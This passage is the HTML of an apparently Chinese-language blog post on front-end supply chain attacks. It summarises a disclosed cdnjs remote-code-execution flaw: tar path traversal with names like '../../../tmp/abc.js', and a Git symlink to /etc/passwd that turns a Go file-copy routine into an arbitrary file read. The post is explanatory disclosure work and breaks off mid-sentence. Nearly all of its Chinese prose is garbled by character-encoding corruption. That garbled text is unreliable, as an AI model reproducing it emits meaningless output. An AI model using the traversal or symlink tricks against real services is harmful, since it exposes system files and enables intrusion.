      "content_html": "<h2 id=\"%E5%89%8D%E8%A8%80\"><a class=\"direct-link\" href=\"#%E5%89%8D%E8%A8%80\">#</a> å‰è¨€</h2>\n<p>Supply chain attackï¼Œä¸­æ–‡ç¿»æˆä¾›æ‡‰éˆæ”»æ“Šï¼Œé€™å€‹æ‰‹æ³•ç„æº–äº†ä¸Šæ¸¸çš„æ¼æ´é€²è¡Œæ”»æ“Šï¼Œå› ç‚ºåªè¦æ±¡æŸ“äº†ä¸Šæ¸¸ï¼Œä¸‹æ¸¸ä¹Ÿæœƒä¸€ä½µè¢«æ±¡æŸ“ã€‚</p>\n<!-- summary -->\n<p>ä»¥å‰ç«¯ç‚ºä¾‹ï¼Œä½ ä½¿ç”¨çš„ npm å¥—ä»¶æˆ–æ˜¯ç¨‹å¼ç¢¼ä¸­å¼•å…¥çš„ç¬¬ä¸‰æ–¹ scriptï¼Œé€™äº›å°±å«åšã€Œä¸Šæ¸¸ã€ï¼Œåœ¨ä½¿ç”¨é€™äº›ç¬¬ä¸‰æ–¹è³‡æºçš„åŒæ™‚ï¼Œä½ æœ‰æ„è­˜åˆ°é€™ä¹Ÿä¼´éš¨äº†ä¸€å®šçš„é¢¨éšªå—ï¼Ÿ</p>\n<p>é€™ç¯‡æ–‡ç« æœƒä»¥ cdnjs ç‚ºä¾‹ï¼Œå¸¶å¤§å®¶çœ‹çœ‹å‰ç«¯çš„ä¾›æ‡‰éˆæ”»æ“Šèˆ‡é˜²ç¦¦ã€‚</p>\n<!-- summary -->\n<h2 id=\"cdnjs\"><a class=\"direct-link\" href=\"#cdnjs\">#</a> cdnjs</h2>\n<p>åœ¨å¯«å‰ç«¯çš„æ™‚å€™ï¼Œå¸¸å¸¸æœƒç¢°åˆ°è¨±å¤šè¦ä½¿ç”¨ç¬¬ä¸‰æ–¹ library çš„å ´åˆï¼Œä¾‹å¦‚èªª jQuery æˆ–è€…æ˜¯ Bootstrap ä¹‹é¡çš„ï¼ˆå‰è€…åœ¨ npm ä¸Šæ¯é€± 400 è¬æ¬¡ä¸‹è¼‰ï¼Œå¾Œè€… 300 è¬æ¬¡ï¼‰ã€‚å…ˆæ’‡é–‹ç¾åœ¨å…¶å¯¦å¤§å¤šæ•¸éƒ½æœƒç”¨ webpack è‡ªå·±æ‰“åŒ…é€™é»ä¸è«‡ï¼Œåœ¨ä»¥å¾€åƒé€™ç¨®éœ€æ±‚ï¼Œè¦å˜›å°±æ˜¯è‡ªå·±ä¸‹è¼‰ä¸€ä»½æª”æ¡ˆï¼Œè¦å˜›å°±æ˜¯æ‰¾ç¾æˆçš„ CDN ä¾†è¼‰å…¥ã€‚</p>\n<p>è€Œ cdnjs å°±æ˜¯å…¶ä¸­ä¸€å€‹ä¾†æºï¼Œå®ƒçš„å®˜ç¶²é•·é€™æ¨£ï¼š</p>\n<p><figure><img src=\"/img/posts/huli/front-end-supply-chain-attack-cdnjs/cdnjs.png\" alt=\"cdnjs æˆªåœ–\"/><figcaption><p>åœ–ç‰‡æ“·å–è‡ª <a href=\"https://cdnjs.com/\">cdnjs</a> å®˜ç¶²</p>\n</figcaption></figure></p>\n<p>é™¤äº† cdnjsï¼Œä¹Ÿæœ‰å…¶ä»–æä¾›é¡ä¼¼æœå‹™çš„ç¶²ç«™ï¼Œä¾‹å¦‚èªªåœ¨ <a href=\"https://jquery.com/download/\">jQuery</a> å®˜ç¶²ä¸Šå¯ä»¥çœ‹è¦‹ä»–å€‘è‡ªå·±çš„ <a href=\"http://code.jquery.com\">code.jquery.com</a> ï¼Œè€Œ <a href=\"https://getbootstrap.com/\">Bootstrap</a> å‰‡æ˜¯ä½¿ç”¨äº†å¦ä¸€å€‹å«åš <a href=\"https://www.jsdelivr.com/\">jsDelivr</a> çš„æœå‹™ã€‚</p>\n<p>èˆ‰å€‹å¯¦éš›çš„ä¾‹å­å§ï¼</p>\n<p>å‡è¨­æˆ‘ç¾åœ¨åšçš„ç¶²ç«™éœ€è¦ç”¨åˆ° jQueryï¼Œæˆ‘å°±è¦åœ¨é é¢ä¸­ç”¨ <code>&lt;script&gt;</code> æ¨™ç±¤è¼‰å…¥ jQuery é€™å€‹å‡½å¼åº«ï¼Œè€Œé€™å€‹ä¾†æºå¯ä»¥æ˜¯ï¼š</p>\n<ol>\n<li>æˆ‘è‡ªå·±çš„ç¶²ç«™</li>\n<li>jsDelivr: <a href=\"https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js\">https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js</a></li>\n<li>cdnjs: <a href=\"https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js\">https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js</a></li>\n<li>jQuery å®˜æ–¹ï¼š<a href=\"https://code.jquery.com/jquery-3.6.0.min.js\">https://code.jquery.com/jquery-3.6.0.min.js</a></li>\n</ol>\n<p>å‡è¨­æˆ‘æœ€å¾Œé¸æ“‡äº† jQuery å®˜æ–¹æä¾›çš„ç¶²å€ï¼Œå°±æœƒå¯«ä¸‹é€™ä¸€æ®µ HTMLï¼š</p>\n<pre class=\"language-html\"><code class=\"language-html\"><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>script</span> <span class=\"token attr-name\">src</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>https://code.jquery.com/jquery-3.6.0.min.js<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span><span class=\"token script\"></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>script</span><span class=\"token punctuation\">></span></span></code></pre>\n<p>å¦‚æ­¤ä¸€ä¾†ï¼Œå°±è¼‰å…¥äº† jQuery é€™å€‹å‡½å¼åº«ï¼Œå…¶ä»–ç¨‹å¼ç¢¼å°±å¯ä»¥ä½¿ç”¨å®ƒæ‰€æä¾›çš„åŠŸèƒ½ã€‚</p>\n<p>é‚£ç‚ºä»€éº¼æˆ‘è¦é¸æ“‡ CDNï¼Œè€Œä¸æ˜¯é¸æ“‡ä¸‹è¼‰ä¸‹ä¾†ï¼Œæ”¾åœ¨è‡ªå·±çš„ç¶²ç«™ä¸Šå‘¢ï¼Ÿå¯èƒ½æœ‰å¹¾å€‹ç†ç”±ï¼š</p>\n<ol>\n<li>æ‡¶æƒ°ï¼Œç›´æ¥ç”¨åˆ¥äººçš„æœ€å¿«</li>\n<li>é ç®—è€ƒé‡ï¼Œæ”¾åˆ¥äººç¶²ç«™å¯ä»¥ç¯€çœè‡ªå·±ç¶²ç«™æµé‡èŠ±è²»è·Ÿè² è·</li>\n<li>é€Ÿåº¦è€ƒé‡</li>\n</ol>\n<p>ç¬¬ä¸‰é»é€Ÿåº¦è€ƒé‡å€¼å¾—ç‰¹åˆ¥èªªæ˜ä¸€ä¸‹ï¼Œå¦‚æœè¼‰å…¥çš„å‡½å¼åº«æ˜¯ä¾†è‡ªæ–¼ CDNï¼Œä¸‹è¼‰çš„é€Ÿåº¦å¯èƒ½æœƒæ¯”è¼ƒå¿«ã€‚</p>\n<p>æ¯”è¼ƒå¿«çš„ç¬¬ä¸€å€‹ç†ç”±æ˜¯ä»–å€‘æœ¬ä¾†å°±æ˜¯åš CDN çš„ï¼Œæ‰€ä»¥åœ¨ä¸åŒåœ‹å®¶å¯èƒ½éƒ½æœ‰ç¯€é»ã€‚å‡è¨­ä½ ä¸»æ©Ÿæ”¾åœ¨ç¾åœ‹ï¼Œé‚£è‹¥æ˜¯æ”¾è‡ªå·±ç¶²ç«™ï¼Œå°ç£çš„ä½¿ç”¨è€…å°±è¦é€£åˆ°ç¾åœ‹çš„ä¼ºæœå™¨å»æŠ“é€™äº› libraryï¼Œä½†å¦‚æœæ˜¯ç”¨ CDN æä¾›çš„ç¶²å€ï¼Œå¯èƒ½åªè¦é€£åˆ°å°ç£çš„ç¯€é»å°±å¥½ï¼Œçœå»ä¸€äº›å»¶é²ï¼ˆlatencyï¼‰ã€‚</p>\n<p>ç¬¬äºŒå€‹ç†ç”±æ˜¯å¦‚æœå¤§å®¶éƒ½åœ¨ç”¨é€™å€‹ CDNï¼Œé‚£å®ƒè¢«å¿«å–ä½çš„æ©Ÿç‡å°±æé«˜äº†ã€‚ä¾‹å¦‚èªªï¼Œå‡è¨­ Facebook ä¹Ÿç”¨äº† cdnjs ä¾†è¼‰å…¥ jQuery 3.6.0 ç‰ˆï¼Œé‚£å¦‚æœæˆ‘çš„ç¶²ç«™ä¹Ÿç”¨äº†åŒæ¨£çš„æœå‹™è¼‰å…¥äº†åŒå€‹ libraryï¼Œå°æ–¼é€ è¨ªé Facebook çš„ç€è¦½å™¨ä¾†èªªï¼Œå®ƒå°±ä¸éœ€è¦å†æ¬¡ä¸‹è¼‰æª”æ¡ˆï¼Œå› ç‚ºå·²ç¶“ä¸‹è¼‰éï¼Œè¢«å¿«å–ä½äº†ã€‚</p>\n<p>ï¼ˆ2021-08-09 è£œå……ï¼šæ„Ÿè¬ Ho Hong Yip æ–¼æ–‡ç« ç™¼å‡ºå¾Œåœ¨è‡‰æ›¸å‰ç«¯ç¤¾ç¾¤çš„æŒ‡æ­£ï¼Œç¾åœ¨çš„ç€è¦½å™¨å°æ–¼å¿«å–å¤šåŠ äº†ä¸€å€‹é™åˆ¶ï¼Œä¹Ÿå°±æ˜¯è·¨ç¶²ç«™ï¼ˆæ›´è©³ç´°ä¸€é»èªªæ˜¯æ ¹æ“š eTLD+1 ä¾†åˆ¤æ–·ï¼‰çš„å¿«å–å°‡æœƒåˆ†é–‹ã€‚æ‰€ä»¥å°±ç®— Facebook å·²ç¶“è¼‰å…¥ jQuery 3.6.0ï¼Œä½¿ç”¨è€…é€ è¨ªä½ çš„ç¶²ç«™æ™‚é‚„æ˜¯éœ€è¦å†ä¸‹è¼‰ä¸€æ¬¡ã€‚æ›´è©³ç´°çš„ä»‹ç´¹å¯ä»¥çœ‹é€™ç¯‡ï¼š<a href=\"https://developers.google.com/web/updates/2020/10/http-cache-partitioning\">Gaining security and privacy by partitioning the cache</a>ã€‚å¦‚æ­¤ä¸€ä¾†ï¼Œå¥½åƒåˆå°‘äº†ä¸€å€‹ç”¨ public CDN çš„ç†ç”±äº†ï¼Ÿä½†æ–‡æœ«æœ‰æåˆ° <a href=\"https://docs.google.com/document/d/1lQykm9HgzkPlaKXwpQ9vNc3m2Eq2hF4TY-Vup5wg4qg/edit\">Web Shared Libraries</a> æƒ³è§£æ±ºé€™å€‹å•é¡Œï¼Œåªæ˜¯çœ‹èµ·ä¾†é‚„åœ¨æ—©æœŸéšæ®µã€‚ï¼‰</p>\n<p>ä»¥å¤§å®¶ç†Ÿæ‚‰çš„ <a href=\"https://ithelp.ithome.com.tw/articles?tab=tech\">iT é‚¦å¹«å¿™</a>ç¶²ç«™ç‚ºä¾‹ï¼Œå°±æœ‰ä½¿ç”¨åˆ°ä¾†è‡ªæ–¼ google è·Ÿ cdnjs çš„è³‡æºï¼š</p>\n<p><img src=\"/img/posts/huli/front-end-supply-chain-attack-cdnjs/ithome.png\" alt=\"ithome\"></p>\n<p>å‰é¢è¬›äº†ä¸€äº›ä½¿ç”¨ç¬¬ä¸‰æ–¹ CDN çš„å„ªé»ï¼Œé‚£ç¼ºé»æ˜¯ä»€éº¼å‘¢ï¼Ÿ</p>\n<p>ç¬¬ä¸€å€‹ç¼ºé»æ˜¯å¦‚æœ CDN æ›äº†ï¼Œä½ çš„ç¶²ç«™å¯èƒ½æœƒè·Ÿè‘—ä¸€èµ·æ›ï¼Œå°±ç®—ä¸æ˜¯æ›æ‰ï¼Œé€£ç·šç·©æ…¢ä¹Ÿæ˜¯ä¸€æ¨£ã€‚ä¾‹å¦‚èªªæˆ‘ç¶²ç«™å¾ cdnjs è¼‰å…¥äº† jQueryï¼Œå¯æ˜¯ cdnjs çªç„¶è®Šå¾—å¾ˆæ…¢ï¼Œé‚£æˆ‘çš„ç¶²ç«™ä¹Ÿæœƒè®Šå¾—å¾ˆæ…¢ï¼Œä¸€èµ·è¢«ç‰½é€£ã€‚</p>\n<p>è€Œ cdnjs èƒŒå¾Œçš„å…¬å¸ Cloudflare ç¢ºå¯¦æœ‰<a href=\"https://techcrunch.com/2019/06/24/cloudflare-outage-affecting-numerous-sites-on-monday-am/\">å‡ºéäº‹</a>ï¼Œé€£å¸¶å½±éŸ¿äº†è¨±å¤šç¶²ç«™ã€‚</p>\n<p>ç¬¬äºŒå€‹ç¼ºé»æ˜¯å¦‚æœ CDN è¢«é§­å®¢å…¥ä¾µäº†ï¼Œä½ å¼•å…¥çš„å‡½å¼åº«è¢«æ¤å…¥æƒ¡æ„ç¨‹å¼ç¢¼ï¼Œé‚£ä½ çš„ç¶²ç«™å°±æœƒè·Ÿè‘—ä¸€èµ·è¢«å…¥ä¾µã€‚è€Œé€™æ¨£å­çš„æ”»æ“Šæ‰‹æ³•ï¼Œå°±æ˜¯é€™ç¯‡çš„ä¸»é¡Œï¼šã€Œä¾›æ‡‰éˆæ”»æ“Šã€ï¼Œå¾ä¸Šæ¸¸å…¥ä¾µï¼Œé€£å¸¶å½±éŸ¿åˆ°ä¸‹æ¸¸ã€‚</p>\n<p>æœ‰äº›äººå¯èƒ½æœƒæƒ³èªªï¼šã€Œé€™äº›å¤§å…¬å¸ä¸å¤ªå¯èƒ½è¢«å…¥ä¾µå§ï¼Ÿè€Œä¸”é€™æœå‹™é€™éº¼å¤šäººç”¨ï¼Œä¸€å®šæœ‰äººåœ¨æŠŠé—œå§ã€</p>\n<p>æ¥è‘—ï¼Œå°±è®“æˆ‘å€‘ä¾†çœ‹ä¸€å€‹å¯¦éš›æ¡ˆä¾‹ã€‚</p>\n<h2 id=\"%E8%A7%A3%E6%9E%90-cdnjs-%E7%9A%84-rce-%E6%BC%8F%E6%B4%9E\"><a class=\"direct-link\" href=\"#%E8%A7%A3%E6%9E%90-cdnjs-%E7%9A%84-rce-%E6%BC%8F%E6%B4%9E\">#</a> è§£æ cdnjs çš„ RCE æ¼æ´</h2>\n<p>2021 å¹´ 7 æœˆ 16 è™Ÿï¼Œä¸€åè³‡å®‰ç ”ç©¶å“¡ <a href=\"https://twitter.com/ryotkak\">@ryotkak</a> åœ¨ä»–çš„éƒ¨è½æ ¼ä¸Šç™¼å¸ƒäº†ä¸€ç¯‡æ–‡ç« ï¼Œåç‚ºï¼š<a href=\"https://blog.ryotak.me/post/cdnjs-remote-code-execution-en/\">Remote code execution in cdnjs of Cloudflare</a>ï¼ˆä»¥ä¸‹ç”¨ã€Œä½œè€…ã€ä¾†ç¨±å‘¼ï¼‰ã€‚</p>\n<p>Remote code execution ç°¡ç¨±ç‚º RCEï¼Œé€™ç¨®æ¼æ´å¯ä»¥è®“æ”»æ“Šè€…åŸ·è¡Œä»»æ„ç¨‹å¼ç¢¼ï¼Œæ˜¯é¢¨éšªç­‰ç´šå¾ˆé«˜çš„æ¼æ´ã€‚è€Œä½œè€…ç™¼ç¾äº†ä¸€å€‹ cdnjs çš„ RCE æ¼æ´ï¼Œè‹¥æ˜¯æœ‰å¿ƒåˆ©ç”¨é€™å€‹æ¼æ´çš„è©±ï¼Œå¯ä»¥æ§åˆ¶æ•´å€‹ cdnjs çš„æœå‹™ã€‚</p>\n<p>ä½œè€…çš„éƒ¨è½æ ¼æ–‡ç« æŠŠéç¨‹å¯«å¾—ååˆ†è©³ç´°ï¼Œæˆ‘åœ¨é€™é‚Šç°¡å–®è¬›ä¸€ä¸‹æ¼æ´æ˜¯æ€éº¼å½¢æˆçš„ï¼Œä¸€å…±æœ‰å…©å€‹æ¼æ´ã€‚</p>\n<p>é¦–å…ˆå‘¢ï¼ŒCloudflare æœ‰æŠŠ cdnjs ç›¸é—œçš„ç¨‹å¼ç¢¼é–‹æºåœ¨ GitHub ä¸Šé¢ï¼Œè€Œå…¶ä¸­æœ‰ä¸€å€‹è‡ªå‹•æ›´æ–°çš„åŠŸèƒ½å¼•èµ·äº†ä½œè€…çš„æ³¨æ„ã€‚é€™å€‹åŠŸèƒ½æœƒè‡ªå‹•å»æŠ“ npm ä¸Šæ‰“åŒ…å¥½çš„ package æª”æ¡ˆï¼Œæ ¼å¼æ˜¯å£“ç¸®æª” .tgzï¼Œè§£å£“ç¸®ä¹‹å¾ŒæŠŠæª”æ¡ˆåšä¸€äº›è™•ç†ï¼Œè¤‡è£½åˆ°åˆé©çš„ä½ç½®ã€‚</p>\n<p>è€Œä½œè€…çŸ¥é“åœ¨ Go è£¡é¢å¦‚æœç”¨ <code>archive/tar</code> ä¾†è§£å£“ç¸®çš„è©±å¯èƒ½æœƒæœ‰æ¼æ´ï¼Œå› ç‚ºè§£å£“ç¸®å‡ºä¾†çš„æª”æ¡ˆæ²’æœ‰ç¶“éè™•ç†ï¼Œæ‰€ä»¥æª”åå¯ä»¥é•·å¾—åƒæ˜¯é€™æ¨£ï¼š<code>../../../../../tmp/temp</code></p>\n<p>é•·æˆé€™æ¨£æœ‰ä»€éº¼å•é¡Œå‘¢ï¼Ÿ</p>\n<p>å‡è¨­ä»Šå¤©ä½ æœ‰ä¸€æ®µç¨‹å¼ç¢¼æ˜¯è¤‡è£½æª”æ¡ˆï¼Œç„¶å¾Œåšäº†é¡ä¼¼åº•ä¸‹çš„æ“ä½œï¼š</p>\n<ol>\n<li>ç”¨ç›®çš„åœ° + æª”åæ‹¼æ¹Šå‡ºç›®æ¨™ä½ç½®ï¼Œå»ºç«‹æ–°æª”æ¡ˆ</li>\n<li>è®€å–åŸæœ¬æª”æ¡ˆï¼Œå¯«å…¥æ–°æª”æ¡ˆ</li>\n</ol>\n<p>å¦‚æœç›®çš„åœ°æ˜¯ <code>/packages/test</code>ï¼Œæª”åæ˜¯ <code>abc.js</code>ï¼Œé‚£æœ€å¾Œå°±æœƒåœ¨ <code>/packages/test/abc.js</code> ç”¢ç”Ÿæ–°çš„æª”æ¡ˆã€‚</p>\n<p>é€™æ™‚å€™è‹¥æ˜¯ç›®çš„åœ°ä¸€æ¨£ï¼Œæª”åæ˜¯ <code>../../../tmp/abc.js</code>ï¼Œå°±æœƒåœ¨ <code>/package/test/../../../tmp/abc.js</code> ä¹Ÿå°±æ˜¯ <code>/tmp/abc.js</code> åº•ä¸‹å¯«å…¥æª”æ¡ˆã€‚</p>\n<p>å› æ­¤é€éé€™æ¨£çš„æ‰‹æ³•ï¼Œå¯ä»¥å¯«å…¥æª”æ¡ˆåˆ°ä»»ä½•æœ‰æ¬Šé™çš„åœ°æ–¹ï¼è€Œ cdnjs çš„ç¨‹å¼ç¢¼å°±æœ‰é¡ä¼¼çš„æ¼æ´ï¼Œèƒ½å¤ å¯«å…¥æª”æ¡ˆåˆ°ä»»æ„ä½ç½®ã€‚å¦‚æœèƒ½åˆ©ç”¨é€™æ¼æ´ï¼Œå»è¦†è“‹æ‰åŸæœ¬å°±æœƒå®šæ™‚è‡ªå‹•åŸ·è¡Œçš„æª”æ¡ˆçš„è©±ï¼Œå°±å¯ä»¥é”æˆ RCE äº†ã€‚</p>\n<p>ç•¶ä½œè€…æ­£æƒ³è¦åšå€‹ POC ä¾†é©—è­‰çš„æ™‚å€™ï¼Œçªç„¶å¾ˆå¥½å¥‡é‡å° Git è‡ªå‹•æ›´æ–°çš„åŠŸèƒ½æ˜¯æ€éº¼åšçš„ï¼ˆä¸Šé¢è¬›çš„é—œæ–¼å£“ç¸®æª”çš„æ˜¯é‡å° npm çš„ï¼‰</p>\n<p>è€Œç ”ç©¶éå¾Œï¼Œä½œè€…ç™¼ç¾é—œæ–¼ Git repo çš„è‡ªå‹•æ›´æ–°ï¼Œæœ‰ä¸€æ®µè¤‡è£½æª”æ¡ˆçš„ç¨‹å¼ç¢¼ï¼Œé•·é€™å€‹æ¨£å­ï¼š</p>\n<pre class=\"language-go\"><code class=\"language-go\"><span class=\"token keyword\">func</span> <span class=\"token function\">MoveFile</span><span class=\"token punctuation\">(</span>sourcePath<span class=\"token punctuation\">,</span> destPath <span class=\"token builtin\">string</span><span class=\"token punctuation\">)</span> <span class=\"token builtin\">error</span> <span class=\"token punctuation\">{</span><br>    inputFile<span class=\"token punctuation\">,</span> err <span class=\"token operator\">:=</span> os<span class=\"token punctuation\">.</span><span class=\"token function\">Open</span><span class=\"token punctuation\">(</span>sourcePath<span class=\"token punctuation\">)</span><br>    <span class=\"token keyword\">if</span> err <span class=\"token operator\">!=</span> <span class=\"token boolean\">nil</span> <span class=\"token punctuation\">{</span><br>        <span class=\"token keyword\">return</span> fmt<span class=\"token punctuation\">.</span><span class=\"token function\">Errorf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Couldn't open source file: %s\"</span><span class=\"token punctuation\">,</span> err<span class=\"token punctuation\">)</span><br>    <span class=\"token punctuation\">}</span><br>    outputFile<span class=\"token punctuation\">,</span> err <span class=\"token operator\">:=</span> os<span class=\"token punctuation\">.</span><span class=\"token function\">Create</span><span class=\"token punctuation\">(</span>destPath<span class=\"token punctuation\">)</span><br>    <span class=\"token keyword\">if</span> err <span class=\"token operator\">!=</span> <span class=\"token boolean\">nil</span> <span class=\"token punctuation\">{</span><br>        inputFile<span class=\"token punctuation\">.</span><span class=\"token function\">Close</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><br>        <span class=\"token keyword\">return</span> fmt<span class=\"token punctuation\">.</span><span class=\"token function\">Errorf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Couldn't open dest file: %s\"</span><span class=\"token punctuation\">,</span> err<span class=\"token punctuation\">)</span><br>    <span class=\"token punctuation\">}</span><br>    <span class=\"token keyword\">defer</span> outputFile<span class=\"token punctuation\">.</span><span class=\"token function\">Close</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><br>    <span class=\"token boolean\">_</span><span class=\"token punctuation\">,</span> err <span class=\"token operator\">=</span> io<span class=\"token punctuation\">.</span><span class=\"token function\">Copy</span><span class=\"token punctuation\">(</span>outputFile<span class=\"token punctuation\">,</span> inputFile<span class=\"token punctuation\">)</span><br>    inputFile<span class=\"token punctuation\">.</span><span class=\"token function\">Close</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><br>    <span class=\"token keyword\">if</span> err <span class=\"token operator\">!=</span> <span class=\"token boolean\">nil</span> <span class=\"token punctuation\">{</span><br>        <span class=\"token keyword\">return</span> fmt<span class=\"token punctuation\">.</span><span class=\"token function\">Errorf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Writing to output file failed: %s\"</span><span class=\"token punctuation\">,</span> err<span class=\"token punctuation\">)</span><br>    <span class=\"token punctuation\">}</span><br>    <span class=\"token comment\">// The copy was successful, so now delete the original file</span><br>    err <span class=\"token operator\">=</span> os<span class=\"token punctuation\">.</span><span class=\"token function\">Remove</span><span class=\"token punctuation\">(</span>sourcePath<span class=\"token punctuation\">)</span><br>    <span class=\"token keyword\">if</span> err <span class=\"token operator\">!=</span> <span class=\"token boolean\">nil</span> <span class=\"token punctuation\">{</span><br>        <span class=\"token keyword\">return</span> fmt<span class=\"token punctuation\">.</span><span class=\"token function\">Errorf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Failed removing original file: %s\"</span><span class=\"token punctuation\">,</span> err<span class=\"token punctuation\">)</span><br>    <span class=\"token punctuation\">}</span><br>    <span class=\"token keyword\">return</span> <span class=\"token boolean\">nil</span><br><span class=\"token punctuation\">}</span></code></pre>\n<p>çœ‹èµ·ä¾†æ²’ä»€éº¼ï¼Œå°±æ˜¯è¤‡è£½æª”æ¡ˆè€Œå·²ï¼Œé–‹å•Ÿä¸€å€‹æ–°æª”æ¡ˆï¼ŒæŠŠèˆŠæª”æ¡ˆçš„å…§å®¹è¤‡è£½é€²å»ã€‚</p>\n<p>ä½†å¦‚æœé€™å€‹åŸå§‹æª”æ¡ˆæ˜¯å€‹ symbolic link çš„è©±ï¼Œå°±ä¸ä¸€æ¨£äº†ã€‚åœ¨ç¹¼çºŒå¾€ä¸‹ä¹‹å‰ï¼Œå…ˆç°¡å–®ä»‹ç´¹ä¸€ä¸‹ä»€éº¼æ˜¯ symbolic linkã€‚</p>\n<p>Symbolic link çš„æ¦‚å¿µæœ‰é»åƒæ˜¯ä»¥å‰åœ¨ Windows ä¸Šçœ‹åˆ°çš„ã€Œæ·å¾‘ã€ï¼Œé€™å€‹æ·å¾‘æœ¬èº«åªæ˜¯ä¸€å€‹é€£çµï¼Œé€£åˆ°çœŸæ­£çš„ç›®æ¨™å»ã€‚</p>\n<p>åœ¨é¡ Unix ç³»çµ±è£¡é¢å¯ä»¥ç”¨ <code>ln -s ç›®æ¨™æª”æ¡ˆ æ·å¾‘åç¨±</code> å»å»ºç«‹ä¸€å€‹ symbolic linkï¼Œé€™é‚Šç›´æ¥èˆ‰ä¸€å€‹ä¾‹å­æœƒæ›´å¥½æ‡‚ã€‚</p>\n<p>æˆ‘å…ˆå»ºç«‹ä¸€å€‹æª”æ¡ˆï¼Œå…§å®¹æ˜¯ helloï¼Œä½ç½®æ˜¯ <code>/tmp/hello</code>ã€‚æ¥è‘—æˆ‘åœ¨ç•¶å‰ç›®éŒ„åº•ä¸‹å»ºç«‹ä¸€å€‹ symbolic linkï¼ŒæŒ‡åˆ°å‰›å‰›å»ºç«‹å¥½çš„ hello æª”æ¡ˆï¼š<code>ln -s /tmp/hello link_file</code></p>\n<p>æ¥è‘—æˆ‘å¦‚æœå°å‡º <code>link_file</code> çš„å…§å®¹ï¼Œæœƒå‡ºç¾ <code>hello</code>ï¼Œå› ç‚ºå…¶å¯¦å°±æ˜¯åœ¨å°å‡º <code>/tmp/hello</code> çš„å…§å®¹ã€‚å¦‚æœæˆ‘å° <code>link_file</code> å¯«å…¥è³‡æ–™ï¼Œå¯¦éš›ä¸Šä¹Ÿæ˜¯å° <code>/tmp/hello</code> å¯«å…¥ã€‚</p>\n<p><img src=\"/img/posts/huli/front-end-supply-chain-attack-cdnjs/terminal.png\" alt=\"terminal\"></p>\n<p>å†ä¾†æˆ‘å€‘è©¦è©¦çœ‹ç”¨ Node.js å¯«ä¸€æ®µè¤‡è£½æª”æ¡ˆçš„ç¨‹å¼ç¢¼ï¼Œçœ‹çœ‹æœƒç™¼ç”Ÿä»€éº¼äº‹ï¼š</p>\n<pre class=\"language-js\"><code class=\"language-js\">node <span class=\"token operator\">-</span>e <span class=\"token string\">'require(\"fs\").copyFileSync(\"link_file\", \"test.txt\")'</span></code></pre>\n<p>åŸ·è¡Œå®Œæˆä¹‹å¾Œï¼Œæˆ‘å€‘ç™¼ç¾ç›®éŒ„åº•ä¸‹å¤šäº†ä¸€å€‹ <code>test.txt</code> çš„æª”æ¡ˆï¼Œå…§å®¹æ˜¯ <code>/tmp/hello</code> çš„æª”æ¡ˆå…§å®¹ã€‚</p>\n<p>æ‰€ä»¥ç”¨ç¨‹å¼åœ¨åŸ·è¡Œè¤‡è£½æª”æ¡ˆæ™‚ï¼Œä¸¦ä¸æ˜¯ã€Œè¤‡è£½ä¸€å€‹ symbolic linkã€ï¼Œè€Œæ˜¯ã€Œè¤‡è£½æŒ‡å‘çš„æª”æ¡ˆå…§å®¹ã€ã€‚</p>\n<p>å› æ­¤å‘¢ï¼Œæˆ‘å€‘å‰›å‰›æåˆ°çš„ Go è¤‡è£½æª”æ¡ˆçš„ç¨‹å¼ç¢¼ï¼Œå¦‚æœæœ‰å€‹æª”æ¡ˆæ˜¯æŒ‡å‘ <code>/etc/passwd</code> çš„ symbolic linkï¼Œè¤‡è£½å®Œä»¥å¾Œå°±æœƒç”¢ç”Ÿå‡ºä¸€å€‹å…§å®¹æ˜¯ <code>/etc/passwd</code> çš„æª”æ¡ˆã€‚</p>\n<p>æˆ‘å€‘å¯ä»¥åœ¨ Git çš„æª”æ¡ˆè£¡é¢åŠ ä¸€å€‹ symbolic link åç¨±å«åš <code>test.js</code>ï¼Œè®“å®ƒæŒ‡å‘ <code>/etc/passwd</code>ï¼Œé€™æ¨£è¢« cdnjs è¤‡è£½éå¾Œï¼Œå°±æœƒç”¢ç”Ÿä¸€å€‹ test.js çš„æª”æ¡ˆï¼Œè€Œä¸”è£¡é¢æ˜¯ <code>/etc/passwd</code> çš„å…§å®¹ï¼</p>\n<p>å¦‚æ­¤ä¸€ä¾†ï¼Œå°±å¾—åˆ°äº†ä¸€å€‹ä»»æ„æª”æ¡ˆè®€å–ï¼ˆArbitrary File Readï¼‰çš„æ¼æ´ã€‚</p>\n<p>è¬›åˆ°é€™é‚Šç¨å¾®åšå€‹ç¸½çµï¼Œä½œè€…ä¸€å…±æ‰¾åˆ°å…©å€‹æ¼æ´ï¼Œä¸€å€‹å¯ä»¥å¯«æª”æ¡ˆä¸€å€‹å¯ä»¥è®€æª”æ¡ˆï¼Œå¯«æª”æ¡ˆå¦‚æœä¸å°å¿ƒè¦†è“‹é‡è¦æª”æ¡ˆæœƒè®“ç³»çµ±æ›æ‰ï¼Œå› æ­¤ä½œè€…æ±ºå®šå¾è®€æª”æ¡ˆé–‹å§‹åš POCï¼Œè‡ªå·±å»ºäº†ä¸€å€‹ Git å€‰åº«ç„¶å¾Œç™¼ä½ˆæ–°ç‰ˆæœ¬ï¼Œç­‰ cdnjs å»è‡ªå‹•æ›´æ–°ï¼Œæœ€å¾Œè§¸ç™¼æª”æ¡ˆè®€å–çš„æ¼æ´ï¼Œåœ¨ cdnjs ç™¼å¸ƒçš„ JS ä¸Šé¢å°±å¯ä»¥çœ‹åˆ°è®€åˆ°çš„æª”æ¡ˆå…§å®¹ã€‚</p>\n<p>è€Œä½œè€…è®€çš„æª”æ¡ˆæ˜¯ 